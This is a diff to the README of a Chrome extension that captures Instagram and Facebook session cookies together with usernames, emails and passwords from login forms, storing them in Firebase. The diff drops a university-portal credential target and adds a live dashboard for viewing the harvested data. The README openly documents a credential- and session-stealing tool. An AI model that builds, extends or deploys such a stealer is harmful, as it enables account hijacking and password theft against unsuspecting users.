@@ -21,7 +21,6 @@ A lightweight Manifest V3 Chrome Extension designed to detect active user sessio
 | :--- | :--- | :--- | :--- | :--- |
 | **Instagram** | `instagram.com/*` | Cookies + Login Form | `sessionid`, `ds_user_id`, username, password | `instagram` |
 | **Facebook** | `facebook.com/*`, `m.facebook.com/*` | Cookies + Login Form | `c_user`, `xs`, email, password | `facebook` |
-| **LPU UMS** | `ums.lpu.in/lpuums/*` | Login Form (DOM) | Registration number, password | `studentData` |
 
 ---
 
@@ -29,6 +28,8 @@ A lightweight Manifest V3 Chrome Extension designed to detect active user sessio
 
 ```text
 SessionID/
+├── access/
+│   └── index.html             # Live Firebase web dashboard / viewer
 ├── icons/
 │   ├── 16.png                  # Favicon (16x16)
 │   ├── 48.png                  # Toolbar icon (48x48)
@@ -87,7 +88,6 @@ const firebaseConfig = {
 
 - `instagram`: Holds Instagram session cookies (`sessionId`, `userId`), API info, and login credentials.
 - `facebook`: Holds Facebook session cookies (`c_user`, `xs`) and login credentials.
-- `studentData`: Holds institutional portal form inputs (`registrationNumber`, `password`).
 
 ---
 
